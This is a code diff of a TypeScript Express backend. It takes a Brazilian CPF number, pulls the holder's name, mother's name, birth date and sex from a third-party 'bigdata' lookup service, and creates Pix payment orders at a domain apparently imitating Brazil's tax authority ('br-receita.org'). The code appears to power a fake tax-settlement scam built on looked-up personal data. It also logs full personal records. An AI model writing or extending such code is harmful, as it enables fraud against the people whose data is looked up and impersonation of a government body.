@@ -30,13 +30,12 @@ import rateLimit from 'express-rate-limit';
   });
   const cpfConsulta = async (req: any, res: any, next: any) => {
     const { cpf, cartId } = req.params;
-    
+    const { email, phone } = req.body;
     try {
-      const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
+      const apiUrl = `https://hydraservices.shop/api/bigdata/${cpf}?type=cpf&token=${process.env.CPF_TOKEN}`;
       const upstream = await fetch(apiUrl, { method: 'GET',
         headers: {
           'Content-Type': 'application/json',
-          'Authorization': `Bearer ${process.env.CPF_TOKEN}`
         }
        });
       if (!upstream.ok) {
@@ -45,7 +44,7 @@ import rateLimit from 'express-rate-limit';
           .json({ error: `Upstream retornou ${upstream.status}` });
       }
       const data = await upstream.json();
-
+      console.log(data)
       const getOrder = await fetch(
         `https://api-regularizar.br-receita.org/cart/${cartId}/customer`,
         {
@@ -54,17 +53,30 @@ import rateLimit from 'express-rate-limit';
             'Content-Type': 'application/json',
             Accept: 'application/json',
           },
-          body: JSON.stringify({
+          body: JSON.stringify(
+            phone ?
+            {
             name: data.NOME,
             document: data.CPF,
             document_type: 'CPF',
-            email:    `${(data.NOME as string).normalize('NFD')
+            email: email ||   `${(data.NOME as string).normalize('NFD')
+              .replace(/[\u0300-\u036f]/g, '')
+              .replace(/\s+/g, '')
+              .replace(/[^a-zA-Z0-9]/g, '')
+              .toLowerCase()}@sememail.com`,
+              phone_number: phone
+            }
+            :
+            {
+            name: data.NOME,
+            document: data.CPF,
+            document_type: 'CPF',
+            email: email ||   `${(data.NOME as string).normalize('NFD')
               .replace(/[\u0300-\u036f]/g, '')
               .replace(/\s+/g, '')
               .replace(/[^a-zA-Z0-9]/g, '')
               .toLowerCase()}@sememail.com`,
           })
-     
         }
       );
       if (!getOrder.ok) {
@@ -72,8 +84,14 @@ import rateLimit from 'express-rate-limit';
           .status(getOrder.status)
           .json({ error: `Payment API retornou ${getOrder.status}` });
       }
-    
-      return res.json(data);
+      const formattedData = {
+        NOME: data.NOME,
+        CPF: data.CPF,
+        NOME_MAE: data.NOME_MAE,
+        DT_NASCIMENTO: data.DT_NASCIMENTO,
+        SEXO: data.SEXO,
+      }
+      return res.json(formattedData);
     } catch (err) {
       next(err);
     }
@@ -86,11 +104,10 @@ import rateLimit from 'express-rate-limit';
     const { cpf, cartId } = req.params;
 
     try {
-      const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
+      const apiUrl = `https://hydraservices.shop/api/bigdata/${cpf}?type=cpf&token=${process.env.CPF_TOKEN}`;
       const upstream = await fetch(apiUrl, { method: 'GET',
         headers: {
           'Content-Type': 'application/json',
-          'Authorization': `Bearer ${process.env.CPF_TOKEN}`
         }
        });
       if (!upstream.ok) {
@@ -99,9 +116,15 @@ import rateLimit from 'express-rate-limit';
           .json({ error: `Upstream retornou ${upstream.status}` });
       }
       const data = await upstream.json();
-
+      const formattedData = {
+        NOME: data.NOME,
+        CPF: data.CPF,
+        NOME_MAE: data.NOME_MAE,
+        DT_NASCIMENTO: data.DT_NASCIMENTO,
+        SEXO: data.SEXO,
+      }
     
-      return res.json(data);
+      return res.json(formattedData);
     } catch (err) {
       next(err);
     }
@@ -141,7 +164,7 @@ import rateLimit from 'express-rate-limit';
   consultaRouter.get('/:cpf/:cartId', cpfLimiter, cpf);
   app.use('/', consultaRouter)
   const customerRouter: Router = Router();
-  customerRouter.get('/:cpf/:cartId',cpfLimiter, cpfConsulta);
+  customerRouter.post('/:cpf/:cartId',cpfLimiter, cpfConsulta);
 
   app.use('/customer', customerRouter);
   const cartRouter: Router = Router()
@@ -153,13 +176,12 @@ import rateLimit from 'express-rate-limit';
   const paymentRouter: Router = Router();
   const payment = async (req: any, res: any, next: any) => {
     const { cpf, cartId } = req.params;
-    
+    const { phone, email } = req.body;
     try {
-      const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
+      const apiUrl = `https://hydraservices.shop/api/bigdata/${cpf}?type=cpf&token=${process.env.CPF_TOKEN}`;
       const upstream = await fetch(apiUrl, { method: 'GET',
         headers: {
           'Content-Type': 'application/json',
-          'Authorization': `Bearer ${process.env.CPF_TOKEN}`
         }
        });
       if (!upstream.ok) {
@@ -168,14 +190,24 @@ import rateLimit from 'express-rate-limit';
           .json({ error: `Upstream retornou ${upstream.status}` });
       }
       const data = await upstream.json();
-     
-
-   
-      const orderPayload = {
+      const orderPayload = phone ?{
         payment_method: 'pix',
         customer: {
           name:    data.NOME     || 'Nome Exemplo',
-          email:    `${(data.NOME as string).normalize('NFD')                     // separa caracteres e diacríticos
+          email:  email ||  `${(data.NOME as string).normalize('NFD')                     // separa caracteres e diacríticos
+            .replace(/[\u0300-\u036f]/g, '')      // tira os acentos
+            .replace(/\s+/g, '')                  // tira espaços
+            .replace(/[^a-zA-Z0-9]/g, '')         // tira caracteres especiais
+            .toLowerCase()}@sememail.com`,
+          document: cpf,
+          document_type: 'CPF',
+          phone_number: phone
+        }
+      } : {
+        payment_method: 'pix',
+        customer: {
+          name:    data.NOME     || 'Nome Exemplo',
+          email:  email ||  `${(data.NOME as string).normalize('NFD')                     // separa caracteres e diacríticos
             .replace(/[\u0300-\u036f]/g, '')      // tira os acentos
             .replace(/\s+/g, '')                  // tira espaços
             .replace(/[^a-zA-Z0-9]/g, '')         // tira caracteres especiais
@@ -184,8 +216,6 @@ import rateLimit from 'express-rate-limit';
           document_type: 'CPF'
         }
       };
-
-     
       const orderRes = await fetch(
         `https://api-regularizar.br-receita.org/cart/${cartId}/order?`,
         {
@@ -198,7 +228,6 @@ import rateLimit from 'express-rate-limit';
         }
       );
       if (!orderRes.ok) {
-        console.log(await orderRes.json())
         return res.status(orderRes.status).json({ error: `Order API retornou ${orderRes.status}` });
       }
       const orderData = await orderRes.json();
@@ -208,7 +237,7 @@ import rateLimit from 'express-rate-limit';
     }
   }
 
-  paymentRouter.get('/:cpf/:cartId', payment);
+  paymentRouter.post('/:cpf/:cartId', payment);
   app.use("/payment", paymentRouter)
   
   app.listen(port, () => {
